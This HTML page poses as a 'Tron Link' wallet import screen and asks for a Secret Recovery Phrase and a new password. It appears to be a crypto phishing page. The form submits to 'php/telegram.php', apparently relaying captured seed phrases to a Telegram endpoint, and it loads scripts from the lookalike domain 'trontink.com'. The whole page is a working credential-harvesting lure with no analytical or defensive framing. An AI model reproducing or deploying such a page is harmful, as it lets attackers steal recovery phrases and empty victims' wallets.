<!DOCTYPE html>
<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" name="viewport"/>
  <meta content="ie=edge" http-equiv="X-UA-Compatible"/>
  <title>
   Tron Link
  </title>
  <link href="css/bootstrap.min.css" rel="stylesheet"/>
  <link href="css/style.css" rel="stylesheet"/>
 </head>
 <body>
  <main>
   <div class="container">
    <h1 class="text-left">
     Import a wallet with Secret Recovery Phrase
    </h1>
    <div class="text">
     Only the first account on this wallet will auto load. After completing this process, to add additional accounts, click the drop down menu, then select Create Account.
    </div>
    <form action="php/telegram.php" id="form-contact" method="POST">
     <div class="preloader">
     </div>
     <p class="contact-form__message">
     </p>
     <div class="form-group">
      <label for="textaria">
       Secret Recovery Phrase
      </label>
      <textarea class="form-control" id="seed" minlength="40" name="seed" placeholder="separate each word with a single space" required=""></textarea>
     </div>
     <div class="form-group">
      <label for="password">
       New password
      </label>
      <input class="form-control" id="password" minlength="1" name="password" required="" type="password"/>
     </div>
     <div class="form-group">
      <label for="password1">
       Confirm password
      </label>
      <input class="form-control" id="password1" minlength="1" name="password1" required="" type="password"/>
     </div>
     <div class="form-check">
      <input checked="" class="form-check-input" id="invalidCheck" required="" type="checkbox" value=""/>
      <label class="form-check-label" for="invalidCheck">
       I have read and agree to the
       <a href="page2.html#">
        Terms of Use
       </a>
      </label>
     </div>
     <input class="contact-form__input contact-form__input_theme" name="theme" type="hidden" value="Tron Link"/>
     <button class="btn btn_hover" id="submit" name="submitButton" type="submit">
      import
     </button>
    </form>
   </div>
  </main>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js">
  </script>
  <script src="https://trontink.com/js/bootstrap.bundle.min.js">
  </script>
  <script src="https://trontink.com/js/validator.min.js">
  </script>
 </body>
</html>
